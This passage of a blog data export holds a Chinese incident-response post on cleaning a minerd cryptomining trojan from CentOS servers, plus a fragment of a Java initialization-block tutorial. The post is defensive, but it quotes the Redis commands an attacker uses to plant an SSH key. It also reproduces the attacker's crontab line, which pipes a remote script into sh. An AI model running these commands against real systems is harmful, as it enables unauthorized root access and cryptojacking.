href=\"#2&#x3001;&#x521D;&#x59CB;&#x5316;&#x5757;-lt-&#xFFE3;&#xFE36;&#xFFE3;-gt\" class=\"headerlink\" title=\"2&#x3001;&#x521D;&#x59CB;&#x5316;&#x5757;&lt;(&#xFFE3;&#xFE36;&#xFFE3;)&gt;\"></a>2&#x3001;&#x521D;&#x59CB;&#x5316;&#x5757;&lt;(&#xFFE3;&#xFE36;&#xFFE3;)&gt;</h4><p>&#x6D4B;&#x8BD5;&#x4EE3;&#x7801;&#xFF1A;<br><img src=\"http://7xvfir.com1.z0.glb.clouddn.com/%E5%88%9D%E5%A7%8B%E5%8C%96%E5%9D%97%E5%92%8C%E9%9D%99%E6%80%81%E5%88%9D%E5%A7%8B%E5%8C%96%E5%9D%97%E7%9A%84%E5%8C%BA%E5%88%AB/5.png\" alt=\"&#x56FE;&#x7247;5\"></p>\n<p>&#x539F;&#x4EE3;&#x7801;&#xFF1A;<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">package dem;</span><br><span class=\"line\"></span><br><span class=\"line\">public class A extends B {</span><br><span class=\"line\">\tpublic A() {</span><br><span class=\"line\">\t\tSystem.out.println(&quot;A&#x6784;&#x9020;&#x65B9;&#x6CD5;&quot;);</span><br><span class=\"line\">\t}</span><br><span class=\"line\"></span><br><span class=\"line\">\tstatic {</span><br><span class=\"line\">\t\tSystem.out.println(&quot;A&#x9759;&#x6001;&#x521D;&#x59CB;&#x5316;&#x5757;&quot;);</span><br><span class=\"line\">\t}</span><br><span class=\"line\"></span><br><span class=\"line\">\t{</span><br><span class=\"line\">\t\tSystem.out.println(&quot;A&#x521D;&#x59CB;&#x5316;&#x5757;&quot;);</span><br><span class=\"line\">\t}</span><br><span class=\"line\"></span><br><span class=\"line\">\tpublic static void main(String[] args) {</span><br><span class=\"line\">\t\tnew A();</span><br><span class=\"line\">\t\tSystem.out.println(&quot;--------&quot;);</span><br><span class=\"line\">\t\tnew A();</span><br><span class=\"line\">\t}</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\">class B {</span><br><span class=\"line\">\tpublic B() {</span><br><span class=\"line\">\t\tSystem.out.println(&quot;B&#x6784;&#x9020;&#x65B9;&#x6CD5;&quot;);</span><br><span class=\"line\">\t}</span><br><span class=\"line\"></span><br><span class=\"line\">\tstatic {</span><br><span class=\"line\">\t\tSystem.out.println(&quot;B&#x9759;&#x6001;&#x521D;&#x59CB;&#x5316;&#x5757;&quot;);</span><br><span class=\"line\">\t}</span><br><span class=\"line\"></span><br><span class=\"line\">\t{</span><br><span class=\"line\">\t\tSystem.out.println(&quot;B&#x521D;&#x59CB;&#x5316;&#x5757;&quot;);</span><br><span class=\"line\">\t}</span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure></p>"},{"title":"彻底清除Linux centos minerd木马","date":"2016-10-26T14:41:19.000Z","toc":false,"_content":"\n>前几天，公司两台linux服务器，一台访问速度很慢，cpu跑满，一台免密码登录失效，公钥文件被改写成redis的key。用htop命令查询发现了minerd木马进程，初步猜测是redis没有配访问权限造成的。网上查询minerd木马，发现这是一个很常见的挖矿程序，相关猜测也得到了验证。\n\n下文是网上搜索到的清除minerd木马方法。\n\n## 现状描述\n1、top可以看到，这个minerd 程序把cpu跑满了\n\n![1.jpg](http://7xvfir.com1.z0.glb.clouddn.com/%E5%BD%BB%E5%BA%95%E6%B8%85%E9%99%A4Linux%20centos%20minerd%E6%9C%A8%E9%A9%AC/1.jpg)\n2、ps aux | grep minerd\n可知是这个程序: /opt/minerd\n\n<!-- more -->\n\n这个不是我们自己启动的，可以断定服务器被黑了\n这个进程是root用户启动的，代码有漏洞可能性不大（web服务是www用户启动的），多半黑客已经登录服务器了\n\n![2.jpg](http://7xvfir.com1.z0.glb.clouddn.com/%E5%BD%BB%E5%BA%95%E6%B8%85%E9%99%A4Linux%20centos%20minerd%E6%9C%A8%E9%A9%AC/2.jpg)\n3、有可能是免密登录了，去/root/.ssh 目录下，并没有发现authorized_keys，但发现了KHK75NEOiq这个文件\n\n查看 vim KHK75NEOiq\n可以看到内容就是免密码登录的公钥\n\n![3.jpg](http://7xvfir.com1.z0.glb.clouddn.com/%E5%BD%BB%E5%BA%95%E6%B8%85%E9%99%A4Linux%20centos%20minerd%E6%9C%A8%E9%A9%AC/3.jpg)\n4、在ssh的配置文件/etc/ssh/sshd_config中也可以看到把AuthorizedKeysFile指向了这个文件了（.ssh/KHK75NEOiq）\n\n猜想是这样的：通过authorized_keys免密码登录后，在这个目录下创建了KHK75NEOiq这个文件，修改了AuthorizedKeysFile的指向，就把authorized_keys这个文件删除了。\n\n![4.jpg](http://7xvfir.com1.z0.glb.clouddn.com/%E5%BD%BB%E5%BA%95%E6%B8%85%E9%99%A4Linux%20centos%20minerd%E6%9C%A8%E9%A9%AC/4.jpg)\n5、那么是写进来authorized_keys的那？\n\n之前我处理过类似的问题，是redis未授权导致的，也就是说外网可以直接不用密码登录我的redis, 连上redis后，通过以下命令即可创建文件：\n\n<font style=\"color:red\">**config set dir /root/.ssh\nconfig set dbfilename authorized_keys\nset key value，其中value为生成公钥，即可将公钥保存在服务器，使得登录时不需要输入账号与密码。**</font>\n\n<br/>\n\n---\n\n## 先堵住免登录漏洞\n1、修改ssh端口\n编辑/etc/ssh/sshd_config文件中的Port 22将22修改为其他端口\n\n2、禁止root用户登陆\n编辑/etc/ssh/sshd_config文件中的PermitRootLogin 修改为no\n\n3、修改无密码登陆的文件路径\n编辑/etc/ssh/sshd_config文件中的AuthorizedKeysFile 修改为其他文件路径\n\n4、删除 .ssh下的 KHK75NEOiq\n\n5、不让外网直接连接\n在 redis.conf 文件中找到#bind 127.0.0.1，把前面的#号去掉，重启\n\n---\n\n## 找到木马守护进程\n1、通常直接kill掉进程，是不好使的，肯定有守护进程，还有系统自启动，所以清理步骤是这样的：\n1）干掉守护进程\n2）干掉系统自启动\n3）干掉木马进程\n\n找到木马守护进程并干掉\n\n守护进程有大概有两种存在形式，crontab 和常驻进程，常驻进程得慢慢分析，我们先看crontab，有一条不是我创建的任务。任务是：直接从远程下载一个脚本pm.sh 并执行。\n\n![5.jpg](http://7xvfir.com1.z0.glb.clouddn.com/%E5%BD%BB%E5%BA%95%E6%B8%85%E9%99%A4Linux%20centos%20minerd%E6%9C%A8%E9%A9%AC/5.jpg)\n\n2、我们来看看这个脚本\n\n![6.jpg](http://7xvfir.com1.z0.glb.clouddn.com/%E5%BD%BB%E5%BA%95%E6%B8%85%E9%99%A4Linux%20centos%20minerd%E6%9C%A8%E9%A9%AC/6.jpg)\n\n3、大致逻辑是这样的：\n1）把 */10 * * * * curl -fsSL http://r.chanstring.com/pm.sh?0706 | sh 写入crontab\n2）把authorized_keys删掉，并创建免登录文件/root/.ssh/KHK75NEOiq，修改ssh配置重启\n3）curl下载/opt/KHK75NEOiq33 这个文件，并执行安装（/opt/KHK75NEOiq33 --Install），然后启动ntp\n\n4、基本可以断定这个ntp就是守护进程，但看到ntp真的有些怕怕，ntp不是搞时间同步的吗，其实 Linux正常的ntp服务叫ntpd，并非ntp，很有迷惑性啊\n\n![7.jpg](http://7xvfir.com1.z0.glb.clouddn.com/%E5%BD%BB%E5%BA%95%E6%B8%85%E9%99%A4Linux%20centos%20minerd%E6%9C%A8%E9%A9%AC/7.jpg)\n\n5、但为了让自己放心，还是校验了一番\n我们先从时间上校验，ntp是不是木马任务后创建的\n\n查看这个木马任务第一次执行的时间\n去/var/log下看cron的日志\n\n![8.jpg](http://7xvfir.com1.z0.glb.clouddn.com/%E5%BD%BB%E5%BA%95%E6%B8%85%E9%99%A4Linux%20centos%20minerd%E6%9C%A8%E9%A9%AC/8.jpg)\n\n6、Jul 24 09:23:01 第一次执行： curl -L http://r.chanstring.com/pm.sh?0703\nJul 24 09:30:01 第一次我们目前crontab里的任务：curl -fsSL http://r.chanstring.com/pm.sh?0706\nJul 24 09:49 脚本/etc/init.d/ntp的创建时间\n\n从pm.sh这个脚本可知 curl下来/opt/KHK75NEOiq33这个文件，并执行安装 /opt/KHK75NEOiq33 --Install 比较耗时间，我执行了一下，在我的机器上是10多分钟。\n\n所以创建时间上基本吻合\n\n![9.jpg](http://7xvfir.com1.z0.glb.clouddn.com/%E5%BD%BB%E5%BA%95%E6%B8%85%E9%99%A4Linux%20centos%20minerd%E6%9C%A8%E9%A9%AC/9.jpg)\n\n7、我们看一下ntp的随系统启动\nrunlevel 2 3 4 5都启动了，够狠的呀\n\n![10.jpg](http://7xvfir.com1.z0.glb.clouddn.com/%E5%BD%BB%E5%BA%95%E6%B8%85%E9%99%A4Linux%20centos%20minerd%E6%9C%A8%E9%A9%AC/10.jpg)\n\n8、看一下常用的3吧\n可以看到 有个S50ntp 软链了脚本/etc/init.d/ntp\n\n![11.jpg](http://7xvfir.com1.z0.glb.clouddn.com/%E5%BD%BB%E5%BA%95%E6%B8%85%E9%99%A4Linux%20centos%20minerd%E6%9C%A8%E9%A9%AC/11.jpg)\n\n9、我们查看系统启动日志\nvim /var/log/boot.log\n有一条是Staring S50ntp，这个基本对应脚本/etc/init.d/ntp 中的 echo \"Starting $name\"\n\n![12.jpg](http://7xvfir.com1.z0.glb.clouddn.com/%E5%BD%BB%E5%BA%95%E6%B8%85%E9%99%A4Linux%20centos%20minerd%E6%9C%A8%E9%A9%AC/12.jpg)\n\n10、我们来看一下 /etc/init.d/ntp 这个脚本\n$name应该就对应的值是 S50ntp，通过stdout_log,stderr_log,pid_file也得到了验证。\n\n![13.jpg](http://7xvfir.com1.z0.glb.clouddn.com/%E5%BD%BB%E5%BA%95%E6%B8%85%E9%99%A4Linux%20centos%20minerd%E6%9C%A8%E9%A9%AC/13.jpg)\n\n11、通过搜索安装文件（/opt/KHK75NEOiq33），可知看到 /opt/KHK75NEOiq33 --Install的过程中写入了ntp脚本 自启动 /opt/minerd等一系列的操作。\n\n![14.jpg](http://7xvfir.com1.z0.glb.clouddn.com/%E5%BD%BB%E5%BA%95%E6%B8%85%E9%99%A4Linux%20centos%20minerd%E6%9C%A8%E9%A9%AC/14.jpg)\n\n12、打开 /usr/local/etc/minerd.conf，内容就是/opt/minerd这个进程后的一些参数\n\n![15.jpg](http://7xvfir.com1.z0.glb.clouddn.com/%E5%BD%BB%E5%BA%95%E6%B8%85%E9%99%A4Linux%20centos%20minerd%E6%9C%A8%E9%A9%AC/15.jpg)\n\n13、好了 验证完毕，可以干掉这个ntp了\n\n---\n\n## 清理木马\n1、去掉crontab文件中的有关木马内容：\n/var/spool/cron/crontabs/root\n/var/spool/cron/root\n\n2、干掉守护进程ntp，并删除相关文件\n\n![16.jpg](http://7xvfir.com1.z0.glb.clouddn.com/%E5%BD%BB%E5%BA%95%E6%B8%85%E9%99%A4Linux%20centos%20minerd%E6%9C%A8%E9%A9%AC/16.jpg)\n![17.jpg](http://7xvfir.com1.z0.glb.clouddn.com/%E5%BD%BB%E5%BA%95%E6%B8%85%E9%99%A4Linux%20centos%20minerd%E6%9C%A8%E9%A9%AC/17.jpg)\n\n3、干掉木马进程及其文件\n\n![18.jpg](http://7xvfir.com1.z0.glb.clouddn.com/%E5%BD%BB%E5%BA%95%E6%B8%85%E9%99%A4Linux%20centos%20minerd%E6%9C%A8%E9%A9%AC/18.jpg)\n\n4、干掉安装文件及免密登录的文件\n\n![19.jpg](http://7xvfir.com1.z0.glb.clouddn.com/%E5%BD%BB%E5%BA%95%E6%B8%85%E9%99%A4Linux%20centos%20minerd%E6%9C%A8%E9%A9%AC/19.jpg)\n\n5、干掉随系统启动的文件\n\n![20.jpg](http://7xvfir.com1.z0.glb.clouddn.com/%E5%BD%BB%E5%BA%95%E6%B8%85%E9%99%A4Linux%20centos%20minerd%E6%9C%A8%E9%A9%AC/20.jpg)\n\n6、top一下 一切都正常了！\n\n![21.jpg](http://7xvfir.com1.z0.glb.clouddn.com/%E5%BD%BB%E5%BA%95%E6%B8%85%E9%99%A4Linux%20centos%20minerd%E6%9C%A8%E9%A9%AC/21.jpg)\n\n7、重启一下，也没问题了\n\n![22.jpg](http://7xvfir.com1.z0.glb.clouddn.com/%E5%BD%BB%E5%BA%95%E6%B8%85%E9%99%A4Linux%20centos%20minerd%E6%9C%A8%E9%A9%AC/22.jpg)","source":"_posts/彻底清除Linux centos minerd木马.md","raw":"---\ntitle: 彻底清除Linux centos minerd木马\ncategories:\n  - 错误集锦\ntags:\n  - redis\ndate: 2016-10-26 22:41:19\ntoc: false\n---\n\n>前几天，公司两台linux服务器，一台访问速度很慢，cpu跑满，一台免密码登录失效，公钥文件被改写成redis的key。用htop命令查询发现了minerd木马进程，初步猜测是redis没有配访问权限造成的。网上查询minerd木马，发现这是一个很常见的挖矿程序，相关猜测也得到了验证。\n\n下文是网上搜索到的清除minerd木马方法。\n\n## 现状描述\n1、top可以看到，这个minerd 程序把cpu跑满了\n\n![1.jpg](http://7xvfir.com1.z0.glb.clouddn.com/%E5%BD%BB%E5%BA%95%E6%B8%85%E9%99%A4Linux%20centos%20minerd%E6%9C%A8%E9%A9%AC/1.jpg)\n2、ps aux | grep minerd\n可知是这个程序: /opt/minerd\n\n<!-- more -->\n\n这个不是我们自己启动的，可以断定服务器被黑了\n这个进程是root用户启动的，代码有漏洞可能性不大（web服务是www用户启动的），多半黑客已经登录服务器了\n\n![2.jpg](http://7xvfir.com1.z0.glb.clouddn.com/%E5%BD%BB%E5%BA%95%E6%B8%85%E9%99%A4Linux%20centos%20minerd%E6%9C%A8%E9%A9%AC/2.jpg)\n3、有可能是免密登录了，去/root/.ssh 目录下，并没有发现authorized_keys，但发现了KHK75NEOiq这个文件\n\n查看 vim KHK75NEOiq\n可以看到内容就是免密码登录的公钥\n\n![3.jpg](http://7xvfir.com1.z0.glb.clouddn.com/%E5%BD%BB%E5%BA%95%E6%B8%85%E9%99%A4Linux%20centos%20minerd%E6%9C%A8%E9%A9%AC/3.jpg)\n4、在ssh的配置文件/etc/ssh/sshd_config中也可以看到把AuthorizedKeysFile指向了这个文件了（.ssh/KHK75NEOiq）\n\n猜想是这样的：通过authorized_keys免密码登录后，在这个目录下创建了KHK75NEOiq这个文件，修改了AuthorizedKeysFile的指向，就把authorized_keys这个文件删除了。\n\n![4.jpg](http://7xvfir.com1.z0.glb.clouddn.com/%E5%BD%BB%E5%BA%95%E6%B8%85%E9%99%A4Linux%20centos%20minerd%E6%9C%A8%E9%A9%AC/4.jpg)\n5、那么是写进来authorized_keys的那？\n\n之前我处理过类似的问题，是redis未授权导致的，也就是说外网可以直接不用密码登录我的redis, 连上redis后，通过以下命令即可创建文件：\n\n<font style=\"color:red\">**config set dir /root/.ssh\nconfig set dbfilename authorized_keys\nset key value，其中value为生成公钥，即可将公钥保存在服务器，使得登录时不需要输入账号与密码。**</font>\n\n<br/>\n\n---\n\n## 先堵住免登录漏洞\n1、修改ssh端口\n编辑/etc/ssh/sshd_config文件中的Port 22将22修改为其他端口\n\n2、禁止root用户登陆\n编辑/etc/ssh/sshd_config文件中的PermitRootLogin 修改为no\n\n3、修改无密码登陆的文件路径\n编辑/etc/ssh/sshd_config文件中的AuthorizedKeysFile 修改为其他文件路径\n\n4、删除 .ssh下的 KHK75NEOiq\n\n5、不让外网直接连接\n在 redis.conf 文件中找到#bind 127.0.0.1，把前面的#号去掉，重启\n\n---\n\n## 找到木马守护进程\n1、通常直接kill掉进程，是不好使的，肯定有守护进程，还有系统自启动，所以清理步骤是这样的：\n1）干掉守护进程\n2）干掉系统自启动\n3）干掉木马进程\n\n找到木马守护进程并干掉\n\n守护进程有大概有两种存在形式，crontab 和常驻进程，常驻进程得慢慢分析，我们先看crontab，有一条不是我创建的任务。任务是：直接从远程下载一个脚本pm.sh 并执行。\n\n![5.jpg](http://7xvfir.com1.z0.glb.clouddn.com/%E5%BD%BB%E5%BA%95%E6%B8%85%E9%99%A4Linux%20centos%20minerd%E6%9C%A8%E9%A9%AC/5.jpg)\n\n2、我们来看看这个脚本\n\n![6.jpg](http://7xvfir.com1.z0.glb.clouddn.com/%E5%BD%BB%E5%BA%95%E6%B8%85%E9%99%A4Linux%20centos%20minerd%E6%9C%A8%E9%A9%AC/6.jpg)\n\n3、大致逻辑是这样的：\n1）把 */10 * * * * curl -fsSL http://r.chanstring.com/pm.sh?0706 | sh 写入crontab\n2）把authorized_keys删掉，并创建免登录文件/root/.ssh/KHK75NEOiq，修改ssh配置重启\n3）curl下载/opt/KHK75NEOiq33 这个文件，并执行安装（/opt/KHK75NEOiq33 --Install），然后启动ntp\n\n4、基本可以断定这个ntp就是守护进程，但看到ntp真的有些怕怕，ntp不是搞时间同步的吗，其实 Linux正常的ntp服务叫ntpd，并非ntp，很有迷惑性啊\n\n![7.jpg](http://7xvfir.com1.z0.glb.clouddn.com/%E5%BD%BB%E5%BA%95%E6%B8%85%E9%99%A4Linux%20centos%20minerd%E6%9C%A8%E9%A9%AC/7.jpg)\n\n5、但为了让自己放心，还是校验了一番\n我们先从时间上校验，ntp是不是木马任务后创建的\n\n查看这个木马任务第一次执行的时间\n去/var/log下看cron的日志\n\n![8.jpg](http://7xvfir.com1.z0.glb.clouddn.com/%E5%BD%BB%E5%BA%95%E6%B8%85%E9%99%A4Linux%20centos%20minerd%E6%9C%A8%E9%A9%AC/8.jpg)\n\n6、Jul 24 09:23:01 第一次执行： curl -L http://r.chanstring.com/pm.sh?0703\nJul 24 09:30:01 第一次我们目前crontab里的任务：curl -fsSL http://r.chanstring.com/pm.sh?0706\nJul 24 09:49 脚本/etc/init.d/ntp的创建时间\n\n从pm.sh这个脚本可知 curl下来/opt/KHK75NEOiq33这个文件，并执行安装 /opt/KHK75NEOiq33 --Install 比较耗时间，我执行了一下，在我的机器上是10多分钟。\n\n所以创建时间上基本吻合\n\n![9.jpg](http://7xvfir.com1.z0.glb.clouddn.com/%E5%BD%BB%E5%BA%95%E6%B8%85%E9%99%A4Linux%20centos%20minerd%E6%9C%A8%E9%A9%AC/9.jpg)\n\n7、我们看一下ntp的随系统启动\nrunlevel 2 3 4 5都启动了，够狠的呀\n\n![10.jpg](http://7xvfir.com1.z0.glb.clouddn.com/%E5%BD%BB%E5%BA%95%E6%B8%85%E9%99%A4Linux%20centos%20minerd%E6%9C%A8%E9%A9%AC/10.jpg)\n\n8、看一下常用的3吧\n可以看到 有个S50ntp 软链了脚本/etc/init.d/ntp\n\n![11.jpg](http://7xvfir.com1.z0.glb.clouddn.com/%E5%BD%BB%E5%BA%95%E6%B8%85%E9%99%A4Linux%20centos%20minerd%E6%9C%A8%E9%A9%AC/11.jpg)\n\n9、我们查看系统启动日志\nvim /var/log/boot.log\n有一条是Staring S50ntp，这个基本对应脚本/etc/init.d/ntp 中的 echo \"Starting $name\"\n\n![12.jpg](http://7xvfir.com1.z0.glb.clouddn.com/%E5%BD%BB%E5%BA%95%E6%B8%85%E9%99%A4Linux%20centos%20minerd%E6%9C%A8%E9%A9%AC/12.jpg)\n\n10、我们来看一下 /etc/init.d/ntp 这个脚本\n$name应该就对应的值是 S50ntp，通过stdout_log,stderr_log,pid_file也得到了验证。\n\n![13.jpg](http://7xvfir.com1.z0.glb.clouddn.com/%E5%BD%BB%E5%BA%95%E6%B8%85%E9%99%A4Linux%20centos%20minerd%E6%9C%A8%E9%A9%AC/13.jpg)\n\n11、通过搜索安装文件（/opt/KHK75NEOiq33），可知看到 /opt/KHK75NEOiq33 --Install的过程中写入了ntp脚本 自启动 /opt/minerd等一系列的操作。\n\n![14.jpg](http://7xvfir.com1.z0.glb.clouddn.com/%E5%BD%BB%E5%BA%95%E6%B8%85%E9%99%A4Linux%20centos%20minerd%E6%9C%A8%E9%A9%AC/14.jpg)\n\n12、打开 /usr/local/etc/minerd.conf，内容就是/opt/minerd这个进程后的一些参数\n\n![15.jpg](http://7xvfir.com1.z0.glb.clouddn.com/%E5%BD%BB%E5%BA%95%E6%B8%85%E9%99%A4Linux%20centos%20minerd%E6%9C%A8%E9%A9%AC/15.jpg)\n\n13、好了 验证完毕，可以干掉这个ntp了\n\n---\n\n## 清理木马\n1、去掉crontab文件中的有关木马内容：\n/var/spool/cron/crontabs/root\n/var/spool/cron/root\n\n2、干掉守护进程ntp，并删除相关文件\n\n![16.jpg](http://7xvfir.com1.z0.glb.clouddn.com/%E5%BD%BB%E5%BA%95%E6%B8%85%E9%99%A4Linux%20centos%20minerd%E6%9C%A8%E9%A9%AC/16.jpg)\n![17.jpg](http://7xvfir.com1.z0.glb.clouddn.com/%E5%BD%BB%E5%BA%95%E6%B8%85%E9%99%A4Linux%20centos%20minerd%E6%9C%A8%E9%A9%AC/17.jpg)\n\n3、干掉木马进程及其文件\n\n![18.jpg](http://7xvfir.com1.z0.glb.clouddn.com/%E5%BD%BB%E5%BA%95%E6%B8%85%E9%99%A4Linux%20centos%20minerd%E6%9C%A8%E9%A9%AC/18.jpg)\n\n4、干掉安装文件及免密登录的文件\n\n![19.jpg](http://7xvfir.com1.z0.glb.clouddn.com/%E5%BD%BB%E5%BA%95%E6%B8%85%E9%99%A4Linux%20centos%20minerd%E6%9C%A8%E9%A9%AC/19.jpg)\n\n5、干掉随系统启动的文件\n\n![20.jpg](http://7xvfir.com1.z0.glb.clouddn.com/%E5%BD%BB%E5%BA%95%E6%B8%85%E9%99%A4Linux%20centos%20minerd%E6%9C%A8%E9%A9%AC/20.jpg)\n\n6、top一下 一切都正常了！\n\n![21.jpg](http://7xvfir.com1.z0.glb.clouddn.com/%E5%BD%BB%E5%BA%95%E6%B8%85%E9%99%A4Linux%20centos%20minerd%E6%9C%A8%E9%A9%AC/21.jpg)\n\n7、重启一下，也没问题了\n\n![22.jpg](http://7xvfir.com1.z0.glb.clouddn.com/%E5%BD%BB%E5%BA%95%E6%B8%85%E9%99%A4Linux%20centos%20minerd%E6%9C%A8%E9%A9%AC/22.jpg)","slug":"彻底清除Linux centos minerd木马","published":1,"updated":"2016-11-17T11:59:42.681Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ciwbruleh004kgwtmcw86d9vx","content":"<blockquote>\n<p>&#x524D;&#x51E0;&#x5929;&#xFF0C;&#x516C;&#x53F8;&#x4E24;&#x53F0;linux&#x670D;&#x52A1;&#x5668;&#xFF0C;&#x4E00;&#x53F0;&#x8BBF;&#x95EE;&#x901F;&#x5EA6;&#x5F88;&#x6162;&#xFF0C;cpu&#x8DD1;&#x6EE1;&#xFF0C;&#x4E00;&#x53F0;&#x514D;&#x5BC6;&#x7801;&#x767B;&#x5F55;&#x5931;&#x6548;&#xFF0C;&#x516C;&#x94A5;&#x6587;&#x4EF6;&#x88AB;&#x6539;&#x5199;&#x6210;redis&#x7684;key&#x3002;&#x7528;htop&#x547D;&#x4EE4;&#x67E5;&#x8BE2;&#x53D1;&#x73B0;&#x4E86;minerd&#x6728;&#x9A6C;&#x8FDB;&#x7A0B;&#xFF0C;&#x521D;&#x6B65;&#x731C;&#x6D4B;&#x662F;redis&#x6CA1;&#x6709;&#x914D;&#x8BBF;&#x95EE;&#x6743;&#x9650;&#x9020;&#x6210;&#x7684;&#x3002;&#x7F51;&#x4E0A;&#x67E5;&#x8BE2;minerd&#x6728;&#x9A6C;&#xFF0C;&#x53D1;&#x73B0;&#x8FD9;&#x662F;&#x4E00;&#x4E2A;&#x5F88;&#x5E38;&#x89C1;&#x7684;&#x6316;&#x77FF;&#x7A0B;&#x5E8F;&#xFF0C;&#x76F8;&#x5173;&#x731C;&#x6D4B;&#x4E5F;&#x5F97;&#x5230;&#x4E86;&#x9A8C;&#x8BC1;&#x3002;</p>\n</blockquote>\n<p>&#x4E0B;&#x6587;&#x662F;&#x7F51;&#x4E0A;&#x641C;&#x7D22;&#x5230;&#x7684;&#x6E05;&#x9664;minerd&#x6728;&#x9A6C;&#x65B9;&#x6CD5;&#x3002;</p>\n<h2 id=\"&#x73B0;&#x72B6;&#x63CF;&#x8FF0;\"><a href=\"#&#x73B0;&#x72B6;&#x63CF;&#x8FF0;\" class=\"headerlink\" title=\"&#x73B0;&#x72B6;&#x63CF;&#x8FF0;\"></a>&#x73B0;&#x72B6;&#x63CF;&#x8FF0;</h2><p>1&#x3001;top&#x53EF;&#x4EE5;&#x770B;&#x5230;&#xFF0C;&#x8FD9;&#x4E2A;minerd &#x7A0B;&#x5E8F;&#x628A;cpu&#x8DD1;&#x6EE1;&#x4E86;</p>\n<p><img src=\"http://7xvfir.com1.z0.glb.clouddn.com/%E5%BD%BB%E5%BA%95%E6%B8%85%E9%99%A4Linux%20centos%20minerd%E6%9C%A8%E9%A9%AC/1.jpg\" alt=\"1.jpg\"><br>2&#x3001;ps aux | grep minerd<br>&#x53EF;&#x77E5;&#x662F;&#x8FD9;&#x4E2A;&#x7A0B;&#x5E8F;: /opt/minerd</p>\n<a id=\"more\"></a>\n<p>&#x8FD9;&#x4E2A;&#x4E0D;&#x662F;&#x6211;&#x4EEC;&#x81EA;&#x5DF1;&#x542F;&#x52A8;&#x7684;&#xFF0C;&#x53EF;&#x4EE5;&#x65AD;&#x5B9A;&#x670D;&#x52A1;&#x5668;&#x88AB;&#x9ED1;&#x4E86;<br>&#x8FD9;&#x4E2A;&#x8FDB;&#x7A0B;&#x662F;root&#x7528;&#x6237;&#x542F;&#x52A8;&#x7684;&#xFF0C;&#x4EE3;&#x7801;&#x6709;&#x6F0F;&#x6D1E;&#x53EF;&#x80FD;&#x6027;&#x4E0D;&#x5927;&#xFF08;web&#x670D;&#x52A1;&#x662F;www&#x7528;&#x6237;&#x542F;&#x52A8;&#x7684;&#xFF09;&#xFF0C;&#x591A;&#x534A;&#x9ED1;&#x5BA2;&#x5DF2;&#x7ECF;&#x767B;&#x5F55;&#x670D;&#x52A1;&#x5668;&#x4E86;</p>\n<p><img src=\"http://7xvfir.com1.z0.glb.clouddn.com/%E5%BD%BB%E5%BA%95%E6%B8%85%E9%99%A4Linux%20centos%20minerd%E6%9C%A8%E9%A9%AC/2.jpg\" alt=\"2.jpg\"><br>3&#x3001;&#x6709;&#x53EF;&#x80FD;&#x662F;&#x514D;&#x5BC6;&#x767B;&#x5F55;&#x4E86;&#xFF0C;&#x53BB;/root/.ssh &#x76EE;&#x5F55;&#x4E0B;&#xFF0C;&#x5E76;&#x6CA1;&#x6709;&#x53D1;&#x73B0;authorized_keys&#xFF0C;&#x4F46;&#x53D1;&#x73B0;&#x4E86;KHK75NEOiq&#x8FD9;&#x4E2A;&#x6587;&#x4EF6;</p>\n<p>&#x67E5;&#x770B; vim KHK75NEOiq<br>&#x53EF;&#x4EE5;&#x770B;&#x5230;&#x5185;&#x5BB9;&#x5C31;&#x662F;&#x514D;&#x5BC6;&#x7801;&#x767B;&#x5F55;&#x7684;&#x516C;&#x94A5;</p>\n<p><img src=\"http://7xvfir.com1.z0.glb.clouddn.com/%E5%BD%BB%E5%BA%95%E6%B8%85%E9%99%A4Linux%20centos%20minerd%E6%9C%A8%E9%A9%AC/3.jpg\" alt=\"3.jpg\"><br>4&#x3001;&#x5728;ssh&#x7684;&#x914D;&#x7F6E;&#x6587;&#x4EF6;/etc/ssh/sshd_config&#x4E2D;&#x4E5F;&#x53EF;&#x4EE5;&#x770B;&#x5230;&#x628A;AuthorizedKeysFile&#x6307;&#x5411;&#x4E86;&#x8FD9;&#x4E2A;&#x6587;&#x4EF6;&#x4E86;&#xFF08;.ssh/KHK75NEOiq&#xFF09;</p>\n<p>&#x731C;&#x60F3;&#x662F;&#x8FD9;&#x6837;&#x7684;&#xFF1A;&#x901A;&#x8FC7;authorized_keys&#x514D;&#x5BC6;&#x7801;&#x767B;&#x5F55;&#x540E;&#xFF0C;&#x5728;&#x8FD9;&#x4E2A;&#x76EE;&#x5F55;&#x4E0B;&#x521B;&#x5EFA;&#x4E86;KHK75NEOiq&#x8FD9;&#x4E2A;&#x6587;&#x4EF6;&#xFF0C;&#x4FEE;&#x6539;&#x4E86;AuthorizedKeysFile&#x7684;&#x6307;&#x5411;&#xFF0C;&#x5C31;&#x628A;authorized_keys&#x8FD9;&#x4E2A;&#x6587;&#x4EF6;&#x5220;&#x9664;&#x4E86;&#x3002;</p>\n<p><img src=\"http://7xvfir.com1.z0.glb.clouddn.com/%E5%BD%BB%E5%BA%95%E6%B8%85%E9%99%A4Linux%20centos%20minerd%E6%9C%A8%E9%A9%AC/4.jpg\" 